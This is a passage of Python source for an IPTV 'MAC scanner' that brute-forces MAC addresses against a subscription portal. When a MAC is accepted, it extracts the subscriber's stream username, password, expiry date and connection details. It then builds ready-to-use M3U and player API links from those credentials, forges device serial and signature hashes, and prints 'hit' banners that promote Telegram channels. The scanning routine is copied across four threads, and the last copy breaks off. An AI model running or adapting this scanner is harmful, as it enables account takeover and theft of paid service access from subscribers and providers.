⢀⣔⣮⣦⡀⣠⣰⣿⡽⢠⠨⣑⢒⣶⣾⣿⣿⣦⣼⡆⡀⢀⡀⠀
⠀⠫⢎⣗⣺⣶⣾⣟⣏⣹⡉⠈⡗⣨⣿⠕⠙⣿⣍⣳⣰⣕⣋⢄
⠀⠀⠀⠀⠈⠀⢀⣰⣿⣿⣿⣿⣷⣛⣹⡀⠀⠙⠽⠿⣛⢱⣝⠏
⠀⠀⠀⠀⠀⠀⡚⣩⣿⣿⡿⡿⣿⠇⡈⠘⡆⠀⠀⠘⠋⠉⠀⠀
⠀⠀⠀⠀⠀⢾⢿⣿⣿⠕⠊⠀⠹⣦⢈⠾⣇⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣿⣏⠀⠀⠀⠀⠘⣿⣿⣶⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢴⣗⠩⠛⠓⠃⠀⠀⠀⠀⠙⢻⣿⣯⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⢫⢽⣤⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠛⠁⠀⠀⠀⠀
🧟🄺🄰🄽🄰🄻🔷🄲🄷🄴🄲🄺🧟
🧟Mac ➢"""+str(durum)+"""
🧟VPN ➢"""+str(vpn)+"""
"""+str(playerapi)+"""

🧟 ʙʏ 🧟 """+str(nickn)+"""     
🧟M3u➤"""+str(m3ulink)+"""


🧟ᴅᴇᴠɪᴄᴇ ᴇɴᴄʀʏᴘᴛɪᴏɴ🧟
🧟SN➢"""+SNENC+"""
🧟SNCut➢"""+SNCUT+"""
🧟Device1➢"""+DEVENC+"""
🧟Device2➢"""+SINGENC+"""


"""
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+"""👅🅻🅸🆅🅴🅻🅸🆂🆃─➤
🧟"""+str(livelist)+"""\n\n
👄FLATULINSKI🧟IPTV👄
      🅗🅤🅛🅚 🅟🅨
 """
		if kanalkata=="2":
			imza=imza+"""
👅🆅🅾🅳🅻🅸🆂🆃─➤
🧟"""+str(vodlist)+"""
👅🆂🅴🆁🅸🅴🆂🅻🅸🆂🆃─➤
🧟"""+str(serieslist)+"""
"""
		print(imza)#yax(imza)
		hityaz=hityaz+1
		yax(imza)
		print(white)#print(imza)
		if hityaz >= hitc:
			hitr="\33[1;33m"
	except:pass
		
	
	
	
cpm=0
cpmx=0
hitr="\33[1;33m"



def echok(mac,bot,total,hitc,oran,tokenr):
	global macv#try:
	global maca#try:  
	global cpm
	global hitr
	try:
	#global cpmx
	
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		#cpm=cpmx
		if str(cpmx)=="0":
			cpm=cpm
		else:
			cpm=cpmx
		echo=("\n\033[1;94mFlatulinski IPTV            Speed "+str(cpm)+"             \33[0m\n\33[0m\033[1;92mHulk Py     \33[0m\033[1;93m "+str(hitr)+"Hits" +str(hitc)+"   \33[0m\n\033[0;96mOfferer \33[0m\033[0;92m "+str(panel)+"   \33[0m\n\033[0;96mMacAdress "+tokenr+str(mac)+" \33[0m\33[1;31m% "+str(oran)+"  \33[0m\n\33[1;35m"  +str(bot)+"  \33[0m\33[1;32mOnline "+str(maca)+"   \33[0m\033[0;94mᴠᴘɴ "+str(macv)+"   \33[0m\33[36mTotal "+str(total)+"   \33[0m  ")
		print(echo)
		cpm=time.time()
	except:pass
			
	

def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpn=vpnips.split('"')[0]
		else:
			vpn="𝐍𝐨𝐭 𝐈𝐧𝐯𝐚𝐥𝐢𝐝"
	except:
		vpn="𝐍𝐨𝐭 𝐈𝐧𝐯𝐚𝐥𝐢𝐝"
	return vpn




def goruntu(link):
	global macv#try:
	global maca#try:    
	try:
		res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
		if res.status_code==302:
			 duru="🆅🅰🆁 ✅😎 "
	except:
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
	if duru=="🆅🅰🆁 ✅😎 ":
		maca=maca+1
	else:
		macv=macv+1
	return duru

		
				
tokenr="\33[0m"								
def hitprint(mac,trh):
	playsound="./sounds/Hulk.mp3"
	file = pathlib.Path()
	try:
		    if file.exists ():
		    	ad.mediaPlay()

		    
	except:pass
	print('     SMAAAASHHHHH  \n  '+str(mac)+'\n  ' + str(trh))






def list(listlink,macs,token,livel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break
			
	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	
	list=kategori
	return list





def m3uapi(playerlink,macs,token):
	mt=""
	bag=0
	
	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					break
	try:
			acon=""
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				
				
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				
				timezone=veri.split('timezone":"')[1]
				timezone=timezone.split('",')[0]
				timezone=timezone.replace("\/","/")
				
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				
				
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				
				bitism=""
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				
				message=veri.split('message":"')[1].split(',')[0].replace('"','')
				
				
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
					
				
				
				mt=("""
    👄FLATULINSKI🧟IPTV👄
         🅗🅤🅛🅚 🅟🅨 
      Windows Edition          ⠀⠀⠀⠀⠀
   Visit us on Telegram    
https://t.me/FlatulinskiIpTvHilfe       
Write Me :
https://t.me/FlatulinskiTv 
🧟‍ Gefickt von 🧟 """+str(nickn)+"""     
🧟Port ➤ """+port+"""
🧟UserName ➤ """+userm+"""
🧟PassWort ➤ """+pasm+"""
🧟ActiveConnetions ➤ """+acon+"""
🧟MaximaleConnetction ➤ """+mcon+""" 
🧟Status ➤ """+status+"""
🧟ZeitZone ➤ """+timezone+"""
⠀⠀⠀⠀⠀⣠⠤⡔⠒⠒⠾⣋⠅⣽⣿⣽⣶⣉⣡⠖⢂⠺⢅⡉⠙⠔⠲⣄⠀⠀
⠀⠀⢀⡾⠋⣁⣐⠈⠉⠀⢀⣀⣠⣿⢿⠟⢿⢧⣀⡁⠁⠀⠉⢙⡿⢥⡀⠀⡦⠀
⠀⢀⡞⠀⣸⣆⣹⣍⡁⢈⠄⡺⢍⣻⣾⣭⡻⠞⠝⢒⠉⠒⠒⢩⣀⣰⠁⠀⣷⣵
⠀⢸⣵⣶⠟⠻⣿⠟⠾⣿⠿⡄⠀⠀⠹⣿⠋⠀⠀⠈⡶⣾⣽⠛⢿⣿⣧⠴⠋⢿
⠀⢸⢧⠀⣤⠞⠃⠀⠀⠹⡓⢤⣀⣀⣀⠼⢄⣀⢀⣰⣖⡫⠃⠀⠈⠻⣿⠀⠐⢺
⠀⢦⠨⠤⠛⠆⠀⠀⠀⠀⠈⢹⣿⣷⡀⠚⣒⣀⣜⣿⡏⠀⠀⠀⠀⣀⡼⣀⠠⣸
⢀⡿⠁⡼⢷⣸⠀⠀⠀⠀⠀⣸⣏⢿⣖⣒⣇⡴⡷⣽⣃⠀⠀⠀⢀⡏⣠⣾⠀⣿
⢨⢡⣾⡆⠘⠃⠀⠀⠀⡠⢪⠃⣼⣧⣌⠉⣿⢿⠁⠀⠈⢂⠀⠀⠀⠛⠯⢅⡰⠟
⠀⠑⠚⠀⠀⠀⠀⠀⠀⢱⠊⢠⠟⡟⣏⢿⡏⠀⢰⡖⢤⠀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠱⠂⣼⢺⠃⢸⠏⠂⠉⠁⠈⢻⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣠⣩⠎⠀⠸⡆⡰⠀⠀⣤⣞⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠚⠊⠀⠀⠀⢠⠙⣾⡖⠸⣻⢸⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡎⡗⠀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡧⠼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⢀⣀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⠤⢤⠞⠀⠀⠀⠀⠀
👄🄵🄻🄰🅃🅄🄻🄸🄽🅂🄺🄸🧟🄸🄿🅃🅅💋
     🅗🅤🅛🅚 🅟🅨

""")
	
	except:pass
	return mt
			
			
def d1():
	global hitc
	global hitr
	global tokenr
	for mac in range(1,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks01"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)



def d2():
	global hitc
	global hitr
	global tokenr
	for mac in range(2,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks02"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d3():
	global hitc
	global hitr
	global tokenr
	for mac in range(3,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks03"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)


def d4():
	global hitc
	global hitr
	global tokenr
	for mac in range(4,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks04"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️» '
			     		serieslist=list(listlink,macs,token,livel)
